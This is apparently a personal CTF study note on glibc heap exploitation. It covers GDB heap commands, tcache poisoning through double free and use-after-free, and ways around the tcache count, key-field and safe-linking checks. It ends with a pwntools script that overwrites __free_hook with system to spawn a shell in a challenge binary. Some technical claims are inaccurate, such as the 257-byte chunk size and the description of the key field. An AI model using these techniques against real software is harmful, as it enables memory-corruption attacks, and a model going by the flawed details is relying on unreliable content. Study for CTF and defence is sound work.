# NOTE CTF
This is a note for the CTF challenges I have solved. It contains write-ups, hints, and resources that I found useful during the competitions.

## HEAP

Allocation size is rounded up to the nearest multiple of 16 bytes on 64-bit systems (8 bytes on 32-bit systems) due to alignment requirements. Additionally, there is a minimum chunk size that includes metadata overhead. And for an allocation of for example 248 bytes, the actual size allocated will be 257 bytes (248 + 8 bytes alignment + 1 byte for the PREV_INUSE flag).

## GDB

- `info proc mappings` : is useful to see the memory layout of the process for *ASLR* challenges.
  - **Example output**:
    - `0x7458f3059000     0x7458f307b000    0x22000        0x0  r--p   /.../libc.so.6` : is the libc address range. The base address is `0x7458f3059000`. Most of the time this is the **first address** displayed by this command for the libc path.
    - `0x7458f324d000     0x7458f324e000     0x1000        0x0  r--p   /.../binary` : is the binary address range. The base address is `0x7458f324d000`. Most of the time this is the **first address** displayed by this command for the binary path.
- `heap chunks` : display the heap chunks with their size and status (in use or free).
- `heap chunk <address>` : display the details of a specific heap chunk.
- `heap bins` : display the state of the various bins (tcache, fastbin, small bin, large bin, unsorted bin).
- `gdb --pid <pid>` : attach gdb to a running process with the specified PID. (`gdb --pid "$(ps aux | grep '[p]rogram_name' | awk '{print $2}')"`")
## Tcache poisoning

Tcache poisoning is a heap exploitation technique that targets the tcache (thread-local cache) mechanism in modern versions of the GNU C Library (glibc). Tcache is used to speed vup memory allocation and deallocation by caching small chunks of memory. 

The tcache is an stack-like LIFO structure that can hold up to 7 chunks of the same size class. When a chunk is freed, it is added to the tcache for its size class. When a chunk of that size is requested, it is taken from the tcache if available.

`Chunk` must be in the range of 0x20 to 0x408 bytes to be stored in the tcache. Each list can have a maximum of 7 chunks. At Glibc 2.26, tcache was introduced.

### Double free

With a double free vulnerability, an attacker can manipulate the tcache to allocate memory at arbitrary locations. This is done by freeing a chunk twice, which adds it to the tcache list twice. When the chunk is allocated again, the attacker can overwrite the forward pointer (fd) of the chunk with an arbitrary address. The next allocation of that size will return a chunk at the address specified in the fd pointer.

Example of tcache double free:

```c
unsigned long overwrite_me = 1;
long *a = malloc(10);
free(a);
free(a);
// head = A and A->fd = A
long *b = malloc(10); // b points to a
// head = A->fd
*b = (long)&overwrite_me; // overwrite fd pointer

long *c = malloc(10); // c points to a again
// head = &overwrite_me
long *d = malloc(10); // d points to a again
// returns &overwrite_me
*d = 2; // overwrite overwrite_me
printf("overwrite_me: %lx\n", overwrite_me); // prints 2
```


### UAF

Use after free (UAF) vulnerabilities can also be exploited using tcache poisoning. When a chunk is freed, it is added to the tcache. If the chunk is later used after being freed, an attacker can manipulate the tcache to allocate memory at arbitrary locations.

Example of tcache UAF:

```c
unsigned long overwrite_me = 1;
long *a = malloc(10);
free(a);

// head = A and A->fd = NULL
*a = (long)&overwrite_me; // overwrite fd pointer
// A->fd = &overwrite_me
long *b = malloc(10); // b points to a
// head = A->fd
long *c = malloc(10); // c points to &overwrite_me
// returns &overwrite_me
*c = 2; // overwrite overwrite_me
printf("overwrite_me: %lx\n", overwrite_me); // prints 2
```

### Tcache list head poisoning

Tcache list head poisoning involves overwriting the head of the tcache list for a specific size class. This can be done by using a UAF or a negative / overflow offset write vulnerability to overwrite the head pointer of the tcache list. When a chunk of that size is allocated, it will return a chunk at the address specified in the head pointer.
Example of tcache list head poisoning with negative offset write:

```c
long int *a = malloc(20);
// ensure the count > 0
long int *b = malloc(0x390);

free(b);
set(b, -14, &__free_hook); // negative offset write to overwrite tcache head

long int *z = malloc(0x390); // z points to __free_hook
*z = hook_overwrite; // overwrite __free_hook
free(b); // trigger __free_hook
```


### Securities

- **Tcache count**: Each tcache bin can hold a maximum of 7 chunks. We can't have Malloc return more than chunks than were legitimately linked into free lists.
  To bypass this, we should do the same amount of allocations as frees before the poisoned allocation.
  Example:
    ```c
    unsigned long overwrite_me = 1;
    long *a = malloc(10);
    long *b = malloc(10);
    free(a);
    free(b);

    // head = B and V->fd = NULL
    *b = (long)&overwrite_me; // overwrite fd pointer
    // B->fd = &overwrite_me
    long *b = malloc(10); // b points to B
    // head = B->fd
    long *c = malloc(10); // c points to &overwrite_me
    // returns &overwrite_me
    *c = 2; // overwrite overwrite_me
    printf("overwrite_me: %lx\n", overwrite_me); // prints 2
```
```

- **Mark freed chunks with a key field**: To mitigate double free vulnerabilities, glibc marks freed chunks with a key field. This key is a random value that is XORed with the fd pointer of the chunk. When a chunk is freed, the key is generated and stored in the chunk. When the chunk is allocated again, the key is checked to ensure that it matches the expected value. If the key does not match, the allocation fails. This could send a double free to `abort()`.
  To bypass this, we can use a UAF vulnerability to overwrite the fd pointer of a chunk after it has been freed. This allows us to set the fd pointer to an arbitrary value without triggering the key check.
  Example:
    ```c
    long *a = malloc(10);
    free(a);
    a[9] = 0x41; // overwrite the key field
    free(a); // no abort() because we overwrote the key field
  ```
  One other way to bypass this is to use **Size toggling**. This technique involves freeing a chunk of a different size before freeing the target chunk again. This causes the key field to be reset, allowing the second free to succeed without triggering an abort. **PREV_INUSE**: 0 when previous chunk (not the previous chunk in the linked list, but the one directly before it in memory) is free (and hence the size of previous chunk is stored in the first field). The very first chunk allocated has this bit set. If it is 1, then we cannot determine the size of the previous chunk.
  `[ prev_size (8 bytes) ][ size (8 bytes) ][ user data... ]` -> `header(a) | user(a) | header(b) | user(b) | ...`
  Example:
    ```c
    long *a = malloc(20);
    long *b = malloc(20);


    // We put the address of of b in multiple places

    free(b);
    *((char *)a + 24) = 0x71; // overwrite the size of b (20 + 4 for metadata)
    // 0x71 = 0x70 + PREV_INUSE (size & ~0xF)
    free(b);
    *((char *)a + 24) = 0x41;
    free(b);
    *((char *)a + 24) = 0x61;
    free(b);
    // Same address in different bins

    // Now we can allocate chunks of different sizes
    e = malloc(0x60); // address of b
    free(e); // put it in the 0x70 bin

    // We can get the chunk from another list
    int *f = malloc(0x10); // address of b
    *f = &target;
    
    c = malloc(0x55); // address of b
    d = malloc(0x55); // address of target

    *d = 2;
  ```

- **Safe-Linking**: Safe-linking is a security feature that protects against tcache poisoning by encoding the fd pointer of a chunk using a xor operation. This makes it difficult for an attacker to predict the address of the next chunk in the tcache list. To bypass this, we need information leak to leak the secret value used for encoding. This will trigger most of the time the error `malloc(): unaligned tcache chunk detected` if we try to allocate a chunk without knowing the secret value.
  The encoding is done using the following macros:
  ```
  ```c
  #define PROTECT_PTR(pos, ptr, type)  \
        ((type)((((size_t)pos) >> PAGE_SHIFT) ^ ((size_t)ptr)))
  #define REVEAL_PTR(pos, ptr, type)   \
        PROTECT_PTR(pos, ptr, type)
  ```

  `PAGE_SHIFT` is 12 on x86_64 (4096 bytes page size).
  Example:
    ```c
    long *a = malloc(10);
    free(a);
    // Assume we have leaked the secret value
    long secret = leak_secret();
    *a = (long)&overwrite_me ^ (secret >> 12); // overwrite fd pointer with encoded value
    long *b = malloc(10); // b points to a
    long *c = malloc(10); // c points to &overwrite_me
    *c = 2; // overwrite overwrite_me
    printf("overwrite_me: %lx\n", overwrite_me); // prints 2
  ```


### Exploit `__free_hook` with tcache poisoning

### Prerequisites

Need to have acces to `malloc`, `free`, an `read malloced` chunk and an `edit malloced` chunk function.

### Steps

1. **Allocate two big chunks**: Allocate two big chunk (e.g., 0x450 bytes) for a future leak.
2. **Free the big chunk**: Free the first big chunk to place it in the unsorted bin. (offset 0)
3. **Read the big chunk**: Read the content of the first big chunk to leak a libc address. Calculate the libc base address using the leaked address and the known offset of `main_arena`.
4. **Allocate three small chunk**: Allocate three small chunks (e.g., 0x20 bytes) to fill the tcache bin for that size. (offset 5, 6, 7)
5. **Free the three small chunks**: Free the three small chunks to place them in the tcache bin for that size. (offset 5, 6, 7)
6. **Overwrite the fd pointer**: Edit the second small chunk to overwrite its fd pointer with the address of `__free_hook` in libc. (offset 6)
7. **Allocate two small chunks**: Allocate two small chunks of the same size (0x20 bytes). The first allocation will return a normal chunk we will put `/bin/sh` inside to use it after, and the second allocation will return a chunk at the address of `__free_hook`. (offset 8, 9)
8. **Overwrite `__free_hook`**: Edit the allocated chunk to overwrite `__free_hook` with the address of `system` (calculated using the libc base address)
10. **Trigger the exploit**: Free the second allocated chunk (which contains `/bin/sh`). This will call `system("/bin/sh")`, giving you a shell.

### Example

```python
from pwn import *

bin_size = 10

add_song(p, 0x450, b'AA') # idx 0
add_song(p, 0x450, b'AA') # idx 1

delete_song(p, 0)

leak = view_song(p, 0) # leak main arena

libc.address = u64(leak.ljust(8, b'\x00')) - 0x1ecbe0 # get libc base

# allocate 3 chunks
for i in range(3):
    add_song(p, bin_size, b'A' * 10) # idx from 3 to 5

for j in range(3):
    delete_song(p, j + 2) # free from idx 3 to 5

"""
Tcachebins[idx=0, size=0x20, count=3] ←  Chunk(addr=0x5c4fd62462e0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) (IDX 5)  ←  Chunk(addr=0x5c4fd62462c0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) (IDX 4)  ←  Chunk(addr=0x5c4fd62462a0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) (IDX 3)
"""

# Overwrite the backward pointer of the last freed chunk to point to __free_hook
edit_song(p, 4, 10, p64(libc.symbols['__free_hook'])) # edit idx 4 FD to __free_hook

"""
Tcachebins[idx=0, size=0x20, count=2] ←  Chunk(addr=0x5c4fd62462e0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) (IDX 5)  ←  Chunk(addr=0x762a20ff7e48, size=0x0, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) (IDX 4)
"""
# We can see that the FD pointer of the chunk at idx 4 now points to __free_hook

add_song(p, bin_size, b'/bin/sh\x00') # idx 6 -> returns the chunk at idx 5 from the tcache

add_song(p, bin_size, p64(libc.symbols['system'])) # idx 7 -> __free_hook = system -> returns chunk at idx 4 from the tcache

delete_song(p, 5) # trigger __free_hook -> free("/bin/sh") -> system("/bin/sh")

p.interactive()
```
```
